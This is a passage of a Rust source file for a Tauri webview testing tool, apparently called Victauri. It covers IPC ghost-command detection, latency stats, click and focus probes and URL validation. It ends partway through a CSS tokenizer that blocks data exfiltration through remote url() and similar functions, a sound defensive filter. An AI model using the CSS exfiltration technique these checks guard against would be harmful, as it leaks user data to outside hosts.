use rmcp::model::{CallToolResult, ContentBlock};

/// Produce a properly escaped JavaScript string literal (with double quotes).
///
/// Non-ASCII characters are escaped to `\uXXXX` sequences to avoid corruption
/// in Tauri's `WebView2` eval pipeline on Windows, which mangles raw UTF-8 bytes.
pub fn js_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\0' => out.push_str("\\u0000"),
            c if c.is_ascii_graphic() || c == ' ' => out.push(c),
            c => {
                for unit in c.encode_utf16(&mut [0; 2]) {
                    use std::fmt::Write;
                    let _ = write!(out, "\\u{unit:04x}");
                }
            }
        }
    }
    out.push('"');
    out
}

/// JavaScript-style truthiness for a JSON value.
///
/// Mirrors what `if (value)` would do in the webview after `eval_js`: `false`,
/// `null`, `0`, `NaN`, `""`, and (pragmatically) empty arrays/objects are falsy;
/// everything else is truthy. Used by `wait_for` with the `expression` condition.
#[must_use]
pub fn json_truthy(value: &serde_json::Value) -> bool {
    match value {
        serde_json::Value::Null => false,
        serde_json::Value::Bool(b) => *b,
        serde_json::Value::Number(n) => n.as_f64().is_some_and(|f| f != 0.0 && !f.is_nan()),
        serde_json::Value::String(s) => !s.is_empty(),
        serde_json::Value::Array(a) => !a.is_empty(),
        serde_json::Value::Object(o) => !o.is_empty(),
    }
}

/// Build the JS that projects the webview IPC log down to just command names for
/// `detect_ghost_commands`.
///
/// When `since_ms` is `Some(ms)` with `ms > 0`, only commands invoked within the
/// last `ms` milliseconds are included. This is a **non-destructive** way to scope
/// ghost detection to the current test's traffic — the alternative,
/// `logs {action:'clear'}`, wipes the session-persistent IPC ring buffer for every
/// other reader. The cutoff is evaluated in the webview's own clock (`Date.now()`),
/// so there is no Rust↔JS clock skew. A non-positive or absent `since_ms` projects
/// the whole accumulated log (the historical behavior).
#[must_use]
pub fn ghost_ipc_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog(0, {{ bodies: false }}) || []){filter}\
         .map(function(c){{ return (c && c.command) || null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Build the JS that projects the webview IPC log down to a per-command **outcome**
/// summary for `detect_ghost_commands`: `{{ command, ok, err }}` per distinct command.
///
/// This is the basis of outcome-based ghost detection (VIC-1). A command that returned
/// success (`ok`) at least once **demonstrably has a backend handler** and can never be a
/// ghost — regardless of whether the app registered it via `#[inspectable]`. A command that
/// only ever errored with a "not found" message is a confirmed ghost. Aggregating per
/// command (not per call) keeps the payload tiny even on a busy app (the same eval-cap
/// concern that made the names-only projection necessary); the error sample is capped.
#[must_use]
pub fn ghost_ipc_outcomes_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (function() {{\
         \n  var log = (window.__VICTAURI__?.getIpcLog(0, {{ bodies: false }}) || []){filter};\
         \n  var byCmd = {{}};\
         \n  for (var i = 0; i < log.length; i++) {{\
         \n    var c = log[i]; if (!c || !c.command) continue;\
         \n    var e = byCmd[c.command] || {{ command: c.command, ok: false, err: null }};\
         \n    if (c.status === 'ok') {{ e.ok = true; }}\
         \n    else if (c.status === 'error') {{\
         \n      var body = ((c.result != null ? String(c.result) : '') + ' ' + (c.error != null ? String(c.error) : ''));\
         \n      var sample = body.slice(0, 160).toLowerCase();\
         \n      /* keep the most diagnostic sample: a 'not found' error always wins over a generic one */\
         \n      if (!e.err || sample.indexOf('not found') !== -1) {{ e.err = sample; }}\
         \n    }}\
         \n    byCmd[c.command] = e;\
         \n  }}\
         \n  return Object.keys(byCmd).map(function(k) {{ return byCmd[k]; }});\
         \n}})();"
    )
}

/// A per-command IPC outcome observed in the webview log (parsed from
/// [`ghost_ipc_outcomes_js`]).
#[derive(Debug, serde::Deserialize)]
pub struct IpcOutcome {
    /// The invoked command name.
    pub command: String,
    /// `true` if the command returned success (HTTP 200) at least once → it provably has a
    /// backend handler.
    #[serde(default)]
    pub ok: bool,
    /// A lowercased sample of an error response (for not-found detection); `None` if the
    /// command never errored.
    #[serde(default)]
    pub err: Option<String>,
}

/// Tauri framework/plugin commands (e.g. `plugin:event|emit`, `plugin:updater|check`) are
/// never application-level ghosts — they are handled by Tauri or its plugins, not the app's
/// `generate_handler!`. (Victauri's own `plugin:victauri|*` traffic is already filtered out
/// at the JS layer.)
fn is_framework_builtin(name: &str) -> bool {
    name.starts_with("plugin:")
}

/// Does an error sample indicate the COMMAND has no backend handler (a true ghost)? Tauri
/// rejects an unregistered command with a "command `<name>` not found"-class message.
///
/// A bare "not found" is deliberately NOT enough — it also matches ordinary application errors
/// (e.g. a real `get_user` handler returning "user not found"), which would be a false ghost. So
/// "not found" only counts when the message also references the command (the word "command" or
/// the command name itself), matching Tauri's actual not-found format. "unknown command" /
/// "not registered" are unambiguous and match on their own. A permission failure
/// ("not allowed"/"forbidden") is intentionally NOT matched — the handler exists, it is blocked.
fn error_means_not_found(err: &str, command: &str) -> bool {
    err.contains("unknown command")
        || err.contains("not registered")
        || (err.contains("not found")
            && (err.contains("command") || err.contains(&command.to_lowercase())))
}

/// Build the enriched ghost-command report from observed IPC OUTCOMES (VIC-1).
///
/// Replaces the registry-only diff — which falsely flagged every real-but-uninstrumented
/// command (e.g. 4DA's `set_language`) and every framework builtin as a ghost — with an
/// outcome-based classification that is correct regardless of how much the app uses
/// `#[inspectable]`:
///
/// * **`confirmed_ghosts`** — invoked, never succeeded, errored "not found": real ghosts
///   (no backend handler), high confidence, registry-independent.
/// * **`verified_handlers`** — returned success at least once → a handler provably exists →
///   never flagged (this is what excludes `set_language`).
/// * **`frontend_only`** — weaker candidate tier: invoked, absent from the registry, NOT a
///   framework builtin, and never observed succeeding. Confirm against the app's
///   `generate_handler!` before treating as a bug.
/// * **`excluded_builtins`** — framework `plugin:*` commands, surfaced for transparency.
///
/// Output is additive JSON (no Rust API break); `registry_only` is unchanged.
#[must_use]
pub fn build_ghost_report(
    outcomes: &[IpcOutcome],
    registry: &victauri_core::CommandRegistry,
) -> serde_json::Value {
    use std::collections::HashSet;

    let invoked: Vec<String> = outcomes.iter().map(|o| o.command.clone()).collect();
    let handled: HashSet<&str> = outcomes
        .iter()
        .filter(|o| o.ok)
        .map(|o| o.command.as_str())
        .collect();
    let report = victauri_core::detect_ghost_commands(&invoked, registry);

    // Confirmed ghosts: never succeeded, not a framework builtin, errored "not found".
    let mut confirmed: Vec<(&str, &str)> = Vec::new();
    for o in outcomes {
        if !o.ok
            && !is_framework_builtin(&o.command)
            && let Some(err) = o.err.as_deref()
            && error_means_not_found(err, &o.command)
        {
            confirmed.push((o.command.as_str(), err));
        }
    }
    let confirmed_names: HashSet<&str> = confirmed.iter().map(|(n, _)| *n).collect();

    // Corrected `frontend_only`: registry-absent candidates, minus proven handlers, minus
    // framework builtins, minus the already-listed confirmed ghosts.
    let frontend_only: Vec<_> = report
        .frontend_only
        .iter()
        .filter(|g| {
            !handled.contains(g.name.as_str())
                && !is_framework_builtin(&g.name)
                && !confirmed_names.contains(g.name.as_str())
        })
        .cloned()
        .collect();

    let excluded_builtins: Vec<&str> = report
        .frontend_only
        .iter()
        .map(|g| g.name.as_str())
        .filter(|n| is_framework_builtin(n))
        .collect();

    let registry_total = report.total_registry_commands;
    let reliability = if registry_total > 0 { "high" } else { "low" };
    let note = format!(
        "Outcome-based ghost detection. `confirmed_ghosts` ({confirmed}) were invoked, never \
         returned success, and errored 'not found' — real missing-handler bugs, high confidence, \
         independent of the registry. `verified_handlers` ({verified}) returned success so they \
         provably HAVE a handler and are never flagged (this is why a real command such as \
         set_language is no longer a false positive). `frontend_only` ({fe}) is the weaker \
         candidate tier: invoked, never observed succeeding, not a framework builtin, and absent \
         from the introspection registry ({registry_total} known) — confirm against the app's \
         generate_handler! before filing. `excluded_builtins` are Tauri/plugin framework \
         commands, never app ghosts. The `reliability` field describes only `frontend_only`; \
         `confirmed_ghosts` is high-confidence regardless.",
        confirmed = confirmed.len(),
        verified = handled.len(),
        fe = frontend_only.len(),
    );

    serde_json::json!({
        "confirmed_ghosts": confirmed
            .iter()
            .map(|(name, error)| serde_json::json!({ "name": name, "error": error }))
            .collect::<Vec<_>>(),
        "verified_handlers": handled.len(),
        "frontend_only": frontend_only,
        "excluded_builtins": excluded_builtins,
        "registry_only": report.registry_only,
        "total_frontend_commands": report.total_frontend_commands,
        "total_registry_commands": registry_total,
        "reliability": reliability,
        "note": note,
    })
}

/// Project the webview IPC log down to `{command, duration_ms}` pairs only — never
/// the request/response bodies.
///
/// The full `getIpcLog()` carries request args + response bodies; on a heavy-traffic
/// real app that easily exceeds the eval result cap, which silently returned an empty
/// string and made `coverage`/`command_timings` report **zero** real traffic even
/// while the app was making hundreds of calls. This minimal projection stays small.
/// `since_ms` time-windows like `ghost_ipc_projection_js`.
#[must_use]
pub fn ipc_timing_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog(0, {{ bodies: false }}) || []){filter}\
         .map(function(c){{ return (c && c.command) ? {{ command: c.command, \
         duration_ms: (typeof c.duration_ms === 'number' ? c.duration_ms : null) }} : null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Compute per-command latency stats (count / min / max / avg / p95 ms) from raw IPC
/// `{command, duration_ms}` entries produced by [`ipc_timing_projection_js`].
///
/// Pending calls (null `duration_ms`) count toward `call_count` but not the latency
/// figures (`timed_samples` reports how many had a measured duration). Output is
/// sorted by `call_count` descending. This turns the live IPC log into a real
/// profile of the app's own frontend traffic — the data `command_timings` was blind
/// to because its counter only sees Victauri-driven `invoke_command` calls.
#[must_use]
pub fn ipc_timing_stats(entries: &[serde_json::Value]) -> Vec<serde_json::Value> {
    use std::collections::BTreeMap;
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    let mut durations: BTreeMap<String, Vec<f64>> = BTreeMap::new();
    for e in entries {
        let Some(cmd) = e.get("command").and_then(|c| c.as_str()) else {
            continue;
        };
        *counts.entry(cmd.to_string()).or_default() += 1;
        if let Some(d) = e.get("duration_ms").and_then(serde_json::Value::as_f64) {
            durations.entry(cmd.to_string()).or_default().push(d);
        }
    }

    let mut out: Vec<serde_json::Value> = counts
        .into_iter()
        .map(|(cmd, call_count)| {
            let mut durs = durations.remove(&cmd).unwrap_or_default();
            durs.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
            let n = durs.len();
            let (min, max, avg, p95) = if n == 0 {
                (None, None, None, None)
            } else {
                let sum: f64 = durs.iter().sum();
                let p95_idx = (((n as f64) * 0.95).ceil() as usize)
                    .saturating_sub(1)
                    .min(n - 1);
                let round1 = |v: f64| (v * 10.0).round() / 10.0;
                (
                    Some(round1(durs[0])),
                    Some(round1(durs[n - 1])),
                    Some(round1(sum / n as f64)),
                    Some(round1(durs[p95_idx])),
                )
            };
            serde_json::json!({
                "command": cmd,
                "call_count": call_count,
                "timed_samples": n,
                "min_ms": min,
                "max_ms": max,
                "avg_ms": avg,
                "p95_ms": p95,
            })
        })
        .collect();

    out.sort_by(|a, b| {
        b.get("call_count")
            .and_then(serde_json::Value::as_u64)
            .cmp(&a.get("call_count").and_then(serde_json::Value::as_u64))
    });
    out
}

/// JS projection that mines the live IPC log into a per-command **catalog** of
/// argument and result *shapes* — the data an app's `generate_handler!` set exposes
/// at runtime but `#[inspectable]`-free apps never put in the registry (4DA: 379
/// commands, every schema field null).
///
/// Shapes are inferred **in JS** and bounded (depth- and key-capped, primitives
/// reduced to their `typeof`, arrays to a single element shape) so the payload stays
/// tiny regardless of how large the real argument/result bodies are — the same
/// busy-app eval-cap failure that bit `coverage`/ghost-detection is structurally
/// avoided here (we never ship the bodies, only their structure).
///
/// Per command it captures: `call_count`, `error_count`, `last_status`, the first
/// observed `arg_shape`, and the first **successful** `result_shape` (falling back to
/// any result when no success was seen).
#[must_use]
pub fn ipc_catalog_projection_js() -> String {
    // NB: kept as one returned expression so `eval_with_return` wraps it correctly.
    "return (function(){\
        var MAXD = 5, MAXK = 60;\
        function shape(v, d){\
            if (v === null) return 'null';\
            if (v === undefined) return 'undefined';\
            if (d >= MAXD) return '\u{2026}';\
            if (Array.isArray(v)) return v.length ? { items: shape(v[0], d+1) } : 'array(empty)';\
            if (typeof v === 'object'){\
                var o = Object.create(null), n = 0;\
                for (var k in v){\
                    if (!Object.prototype.hasOwnProperty.call(v,k)) continue;\
                    if (n++ >= MAXK){ o['\u{2026}'] = 'more'; break; }\
                    o[k] = shape(v[k], d+1);\
                }\
                return o;\
            }\
            return typeof v;\
        }\
        var V = window.__VICTAURI__;\
        var log = V && V.getIpcLog ? (V.getIpcLog(0, { bodies: false }) || []) : [];\
        var cat = Object.create(null), meta = Object.create(null);\
        for (var i = 0; i < log.length; i++){\
            var e = log[i]; if (!e || !e.command) continue;\
            var c = cat[e.command];\
            if (!c){\
                c = cat[e.command] = { command: e.command, call_count: 0, error_count: 0, arg_shape: null, result_shape: null, last_status: null };\
                meta[e.command] = { first: e.id, ok: null };\
            }\
            c.call_count++;\
            var isErr = (e.status && e.status !== 'ok') || (e.error != null);\
            if (isErr) c.error_count++;\
            c.last_status = e.status || (isErr ? 'error' : 'ok');\
            if (!isErr && meta[e.command].ok === null) meta[e.command].ok = e.id;\
        }\
        /* Bodies only for the <= 2 calls per command whose shapes are reported: the first \
           call (args) and the first successful one (result; else the first call). */\
        var ids = [];\
        for (var m in meta){ ids.push(meta[m].first); if (meta[m].ok !== null) ids.push(meta[m].ok); }\
        var full = ids.length ? (V.getIpcLog(0, { ids: ids }) || []) : [];\
        var byId = Object.create(null);\
        for (var j = 0; j < full.length; j++){ if (full[j]) byId[full[j].id] = full[j]; }\
        for (var cmd in cat){\
            var first = byId[meta[cmd].first], ok = meta[cmd].ok !== null ? byId[meta[cmd].ok] : null;\
            if (first && first.args !== undefined) cat[cmd].arg_shape = shape(first.args, 0);\
            var res = ok || first;\
            if (res && res.result !== undefined) cat[cmd].result_shape = shape(res.result, 0);\
        }\
        return Object.keys(cat).map(function(k){ return cat[k]; });\
    })()"
        .to_string()
}

/// Merge an IPC-derived command catalog (from [`ipc_catalog_projection_js`]) with the
/// `#[inspectable]` registry into a single, agent-facing catalog.
///
/// Every command is emitted once. IPC-observed commands carry their live
/// `call_count`/`error_count`/`last_status` and inferred `arg_shape`/`result_shape`;
/// commands known only to the registry are emitted with `observed: false` so an agent
/// still sees the full command surface. Any registry metadata (`description`,
/// `intent`, declared `args`, `return_type`) is attached when present. Sorted by
/// observed call count (busiest first), then name.
#[must_use]
pub fn merge_command_catalog(
    ipc_entries: &[serde_json::Value],
    registry: &[victauri_core::CommandInfo],
) -> Vec<serde_json::Value> {
    use std::collections::BTreeMap;

    // registry name -> info, for metadata enrichment + the unobserved tail.
    let reg: BTreeMap<&str, &victauri_core::CommandInfo> =
        registry.iter().map(|c| (c.name.as_str(), c)).collect();

    let mut out: Vec<serde_json::Value> = Vec::new();
    let mut seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();

    for e in ipc_entries {
        let Some(name) = e.get("command").and_then(|c| c.as_str()) else {
            continue;
        };
        seen.insert(name.to_string());
        let mut entry = serde_json::json!({
            "command": name,
            "observed": true,
            "call_count": e.get("call_count").and_then(serde_json::Value::as_u64).unwrap_or(0),
            "error_count": e.get("error_count").and_then(serde_json::Value::as_u64).unwrap_or(0),
            "last_status": e.get("last_status").cloned().unwrap_or(serde_json::Value::Null),
            "arg_shape": e.get("arg_shape").cloned().unwrap_or(serde_json::Value::Null),
            "result_shape": e.get("result_shape").cloned().unwrap_or(serde_json::Value::Null),
        });
        attach_registry_metadata(&mut entry, reg.get(name).copied());
        out.push(entry);
    }

    // Registry commands never seen on the wire — still part of the command surface.
    for info in registry {
        if seen.contains(&info.name) {
            continue;
        }
        let mut entry = serde_json::json!({
            "command": info.name,
            "observed": false,
            "call_count": 0,
        });
        attach_registry_metadata(&mut entry, Some(info));
        out.push(entry);
    }

    out.sort_by(|a, b| {
        let ca = a
            .get("call_count")
            .and_then(serde_json::Value::as_u64)
            .unwrap_or(0);
        let cb = b
            .get("call_count")
            .and_then(serde_json::Value::as_u64)
            .unwrap_or(0);
        cb.cmp(&ca).then_with(|| {
            a.get("command")
                .and_then(serde_json::Value::as_str)
                .cmp(&b.get("command").and_then(serde_json::Value::as_str))
        })
    });
    out
}

/// Attach non-empty `#[inspectable]` registry metadata (description, intent, declared
/// args, return type) to a catalog entry, when the command is registered with it.
fn attach_registry_metadata(
    entry: &mut serde_json::Value,
    info: Option<&victauri_core::CommandInfo>,
) {
    let (Some(obj), Some(info)) = (entry.as_object_mut(), info) else {
        return;
    };
    if let Some(d) = &info.description {
        obj.insert("description".into(), serde_json::json!(d));
    }
    if let Some(i) = &info.intent {
        obj.insert("intent".into(), serde_json::json!(i));
    }
    if !info.args.is_empty() {
        obj.insert("declared_args".into(), serde_json::json!(info.args));
    }
    if let Some(rt) = &info.return_type {
        obj.insert("declared_return".into(), serde_json::json!(rt));
    }
}

/// The longest prefix of `s` that is at most `max_bytes` long and ends on a character
/// boundary. Byte-slicing app/page text (`&s[..n]`) panics when byte `n` falls inside a
/// multi-byte character, so every length cap on such text goes through here.
#[must_use]
pub fn truncate_at_char_boundary(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    let mut end = max_bytes;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// Page-side probe run before trusted (OS-level) keystrokes: focus element `ref_id`, then
/// report `{found, focused}` — whether focus actually LANDED on it. OS keystrokes go to
/// whatever holds focus, and `focus()` can silently not take (a non-focusable or inert
/// element) or be moved on by a focus handler, so existence is not enough (R4-IN1).
///
/// The deep active element is followed from the top document through open shadow roots
/// (a host reports its shadow root's `activeElement`) and same-origin frames (a frame
/// element reports its document's `activeElement`). A closed shadow root or a cross-origin
/// frame cannot be looked into, so an element behind one reads as not focused.
#[must_use]
pub fn trusted_focus_probe_js(ref_id: &str) -> String {
    format!(
        "var __e=window.__VICTAURI__&&window.__VICTAURI__.getRef({}); \
         if(!__e) return {{found:false,focused:false}}; \
         __e.focus(); \
         var __a=document.activeElement; \
         for(var __i=0;__a&&__i<64;__i++){{ \
           if(__a===__e) return {{found:true,focused:true}}; \
           var __n=null; \
           if(__a.shadowRoot&&__a.shadowRoot.activeElement){{__n=__a.shadowRoot.activeElement;}} \
           else if(__a.tagName==='IFRAME'||__a.tagName==='FRAME'){{ \
             try{{var __d=__a.contentDocument; __n=__d&&__d.activeElement;}}catch(__x){{__n=null;}} }} \
           if(!__n||__n===__a) break; \
           __a=__n; \
         }} \
         return {{found:true,focused:false}}",
        js_string(ref_id)
    )
}

/// Page-side probe run before a trusted (OS-level) click on element `ref_id`: returns the
/// click point `{x, y}` in the TOP window's viewport (CSS pixels), `{error}` when the
/// element cannot take a real click there, or `null` when the ref is unknown (R4-IN2).
///
/// A real OS click lands on whatever is on screen at the point, so the point must be one
/// where the element is actually hit: it runs the same checks as the bridge's
/// actionability check for synthetic clicks (connected, enabled, visible, non-zero size,
/// `pointer-events`, not covered at its center — the covering test is stricter: the hit
/// element must be the element or inside it in the flat tree — slotted light-DOM content
/// counts as inside the `<slot>` it renders in; the hit test descends into open shadow roots,
/// whose content `elementFromPoint` otherwise reports as the shadow host) and then walks up
/// through same-origin frames,
/// adding each frame's content offset and requiring the point to stay inside every
/// viewport on the way and the frame itself to be the element hit there. Layout is page
/// data, so the native side clamps the point to the window's client area as well.
#[must_use]
pub fn trusted_click_probe_js(ref_id: &str) -> String {
    format!(
        "var __e=window.__VICTAURI__&&window.__VICTAURI__.getRef({}); \
         if(!__e) return null; \
         function __no(m){{return {{error:m}};}} \
         function __in(w,x,y){{return x>=0&&y>=0&&x<w.innerWidth&&y<w.innerHeight;}} \
         function __hit(d,x,y){{var h=d.elementFromPoint(x,y),g=0; \
           while(h&&h.shadowRoot&&g++<32){{var i=h.shadowRoot.elementFromPoint(x,y); \
             if(!i||i===h)break; h=i;}} return h;}} \
         function __within(a,b){{for(var n=b;n;n=n.assignedSlot||n.parentNode||n.host){{if(n===a)return true;}} \
           return false;}} \
         if(!__e.isConnected) return __no('element is detached from the DOM'); \
         __e.scrollIntoView({{block:'center',inline:'center',behavior:'instant'}}); \
         var __d=__e.ownerDocument||document, __w=__d.defaultView||window; \
         if(__e.disabled||(__e.getAttribute&&__e.getAttribute('aria-disabled')==='true')) \
           return __no('element is disabled'); \
         var __s=__w.getComputedStyle(__e); \
         if(__s.display==='none'||__s.visibility==='hidden'||parseFloat(__s.opacity)<0.01) \
           return __no('element is not visible'); \
         if(__s.pointerEvents==='none') return __no('element has pointer-events: none'); \
         var __b=__e.getBoundingClientRect(); \
         if(!(__b.width>0&&__b.height>0)) return __no('element has zero size'); \
         var __x=__b.left+__b.width/2, __y=__b.top+__b.height/2; \
         if(!__in(__w,__x,__y)) return __no('element center is outside the viewport'); \
         var __t=__hit(__d,__x,__y); \
         if(!__t||!__within(__e,__t)) \
           return __no('element is covered at its center point'+(__t&&__t.tagName?' by <'+__t.tagName.toLowerCase()+'>':'')); \
         for(var __f=__w,__i=0;__f!==__f.top&&__i<32;__i++){{ \
           var __fe=null; try{{__fe=__f.frameElement;}}catch(__x2){{__fe=null;}} \
           if(!__fe) return __no('element is inside a cross-origin frame'); \
           var __p=__f.parent, __r=__fe.getBoundingClientRect(), __c=__p.getComputedStyle(__fe); \
           __x+=__r.left+(__fe.clientLeft||0)+(parseFloat(__c.paddingLeft)||0); \
           __y+=__r.top+(__fe.clientTop||0)+(parseFloat(__c.paddingTop)||0); \
           if(!__in(__p,__x,__y)) return __no('element center is outside the viewport (clipped by its frame)'); \
           if(__hit(__p.document,__x,__y)!==__fe) \
             return __no('the frame holding the element is covered at the click point'); \
           __f=__p; \
         }} \
         return {{x:__x, y:__y}}",
        js_string(ref_id)
    )
}

pub fn json_result(value: &impl serde::Serialize) -> CallToolResult {
    match serde_json::to_string_pretty(value) {
        Ok(json) => CallToolResult::success(vec![ContentBlock::text(json)]),
        Err(e) => tool_error(e.to_string()),
    }
}

pub fn tool_error(msg: impl Into<String>) -> CallToolResult {
    let mut result = CallToolResult::success(vec![ContentBlock::text(msg)]);
    result.is_error = Some(true);
    result
}

pub fn tool_disabled(name: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("tool '{name}' is disabled by privacy configuration"),
        RecoveryHint::ReportToUser,
    )
}

#[derive(Debug, Clone, Copy)]
pub enum RecoveryHint {
    CheckInput,
    ReportToUser,
}

impl RecoveryHint {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::CheckInput => "CHECK_INPUT",
            Self::ReportToUser => "REPORT_TO_USER",
        }
    }
}

pub fn tool_error_with_hint(msg: impl Into<String>, hint: RecoveryHint) -> CallToolResult {
    let message = msg.into();
    let text = format!(
        "{message}

[hint: {}]",
        hint.as_str()
    );
    let mut result = CallToolResult::success(vec![ContentBlock::text(text)]);
    result.is_error = Some(true);
    result
}

pub fn missing_param(param: &str, action: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("missing required parameter '{param}' for action '{action}'"),
        RecoveryHint::CheckInput,
    )
}

/// Validate a URL for navigation.
///
/// Only `http` and `https` schemes are allowed by default. The `file` scheme
/// is blocked unless `allow_file` is `true` (opt-in via
/// [`VictauriBuilder::allow_file_navigation`](crate::VictauriBuilder::allow_file_navigation)).
pub fn validate_url(url: &str, allow_file: bool) -> Result<(), String> {
    let trimmed: String = url.chars().filter(|c| !c.is_control()).collect();
    match url::Url::parse(&trimmed) {
        Ok(parsed) => match parsed.scheme() {
            "http" | "https" => Ok(()),
            "file" if allow_file => Ok(()),
            "file" => Err("scheme 'file' is not allowed by default; enable with \
                 VictauriBuilder::allow_file_navigation()"
                .to_string()),
            scheme => Err(format!(
                "scheme '{scheme}' is not allowed; use http or https"
            )),
        },
        Err(e) => Err(format!("invalid URL: {e}")),
    }
}

pub fn sanitize_css_color(color: &str) -> Result<String, String> {
    let s = color.trim();
    if s.len() > 100 {
        return Err("CSS color value too long".to_string());
    }
    // Reject CSS escape sequences (\XX hex escapes)
    if s.contains('\\') {
        return Err("CSS escape sequences not allowed in color values".to_string());
    }
    let valid = s
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '#' | '(' | ')' | ',' | '.' | ' ' | '%' | '-'));
    if !valid {
        return Err("invalid characters in CSS color value".to_string());
    }
    let lower = s.to_lowercase();
    if lower.contains("url(") || lower.contains("expression(") {
        return Err("invalid CSS color value".to_string());
    }
    Ok(s.to_string())
}

// ── `css inject` anti-exfiltration check (R5B-CSS1) ─────────────────────────
//
// A real (if minimal) CSS tokenizer, per CSS Syntax Level 3, rather than substring scans over a
// comment-stripped copy: stripping comments first let a `/*` inside a string or an unquoted
// `url(...)` swallow a real remote `url()` that followed it, and a substring scan cannot tell a
// URL position from text. The URL checks are an ALLOWLIST: in a URL position only `data:` and
// scheme-less, same-origin references pass.

/// Functions whose string arguments are URLs (`url("…")`, `src("…")`, `image-set("…" 1x)`, …).
/// A string anywhere inside one of these (at any nesting depth) is checked as a URL.
const CSS_URL_FUNCTIONS: &[&str] = &[
    "url",
    "src",
    "image-set",
    "-webkit-image-set",
    "image",
    "-webkit-image",
    "cross-fade",
    "-webkit-cross-fade",
];

/// Schemes the URL parser treats as "special": for these, `https:host/x` (no slashes) and
/// backslashes still reach a remote host.
const SPECIAL_URL_SCHEMES: &[&str] = &["http", "https", "ws", "wss", "ftp", "file"];

/// CSS input preprocessing: CR, CRLF and FF become LF; NUL becomes U+FFFD.
fn css_preprocess(css: &str) -> Vec<char> {
    let mut out = Vec::with_capacity(css.len());
    let mut chars = css.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\r' => {
                if chars.peek() == Some(&'\n') {
                    chars.next();
                }
                out.push('\n');
            }
            '\u{0C}' => out.push('\n'),
            '\0' => out.push('\u{FFFD}'),
            _ => out.push(c),
        }
    }
    out
}

fn css_is_ws(c: char) -> bool {
    matches!(c, ' ' | '\t' | '\n')
}

fn css_is_ident_start(c: char) -> bool {
    c.is_ascii_alphabetic() || c == '_' || !c.is_ascii()
}

fn css_is_ident_char(c: char) -> bool {
    css_is_ident_start(c) || c.is_ascii_digit() || c == '-'
}

/// Tokenizer over preprocessed CSS, tracking only what the URL check needs.
struct CssUrlScanner {
    chars: Vec<char>,
    pos: usize,
}

impl CssUrlScanner {
    fn at(&self, offset: usize) -> Option<char> {
        self.chars.get(self.pos + offset).copied()
    }

    /// `\` followed by anything but a newline (or EOF) starts an escape.
    fn valid_escape_at(&self, offset: usize) -> bool {
        self.at(offset) == Some('\\') && self.at(offset + 1).is_some_and(|c| c != '\n')
    }

    fn starts_ident_at(&self, offset: usize) -> bool {
        match self.at(offset) {
            Some('-') => {
                self.at(offset + 1)
                    .is_some_and(|c| css_is_ident_start(c) || c == '-')
                    || self.valid_escape_at(offset + 1)
            }
            Some('\\') => self.valid_escape_at(offset),
            Some(c) => css_is_ident_start(c),
            None => false,
        }
    }

    /// Consume an escape; `pos` is just past the backslash.
    fn consume_escape(&mut self) -> char {
        let Some(c) = self.at(0) else {
            return '\u{FFFD}';
        };
        if !c.is_ascii_hexdigit() {
            self.pos += 1;
            return c;
        }
        let mut value: u32 = 0;
        let mut digits = 0;
        while digits < 6 {
            match self.at(0).and_then(|d| d.to_digit(16)) {
                Some(d) => {
                    value = value * 16 + d;
                    digits += 1;
                    self.pos += 1;
                }
                None => break,
            }
        }
        if self.at(0).is_some_and(css_is_ws) {
            self.pos += 1;
        }
        // 0, surrogates and out-of-range code points are U+FFFD.
        match char::from_u32(value) {
            Some(ch) if value != 0 => ch,
            _ => '\u{FFFD}',
        }
    }

    fn consume_ident(&mut self) -> String {
        let mut out = String::new();
        loop {
            match self.at(0) {
                Some(c) if css_is_ident_char(c) => {
                    out.push(c);
                    self.pos += 1;
                }
                Some('\\') if self.valid_escape_at(0) => {
                    self.pos += 1;
                    out.push(self.consume_escape());
                }
                _ => return out,
            }
        }
    }

    /// Consume a string token's value; `pos` is just past the opening quote.
    fn consume_string(&mut self, quote: char) -> String {
        let mut out = String::new();
        loop {
            match self.at(0) {
                None => return out,
                Some(c) if c == quote => {
                    self.pos += 1;
                    return out;
                }
                // An unescaped newline ends a (bad) string; it is not consumed.
                Some('\n') => return out,
                Some('\\') => {
                    self.pos += 1;
                    match self.at(0) {
                        None => {}
                        Some('\n') => self.pos += 1, // line continuation
                        Some(_) => out.push(self.consume_escape()),
                    }
                }
                Some(c) => {
                    out.push(c);
                    self.pos += 1;
                }
            }
        }
    }

    /// Consume an unquoted `url(` token's value up to `)` / EOF, decoding escapes. A bad-url
    /// token (whitespace inside, a quote, `(`) is consumed to the same end point the browser
    /// uses and still checked, which only errs toward rejecting.
    fn consume_url(&mut self) -> String {
        let mut out = String::new();
        loop {
            match self.at(0) {
                None => return out,
                Some(')') => {
                    self.pos += 1;
                    return out;
                }
                Some('\\') if self.valid_escape_at(0) => {
                    self.pos += 1;
                    out.push(self.consume_escape());
                }
                Some(c) => {
                    out.push(c);
                    self.pos += 1;
                }
            }
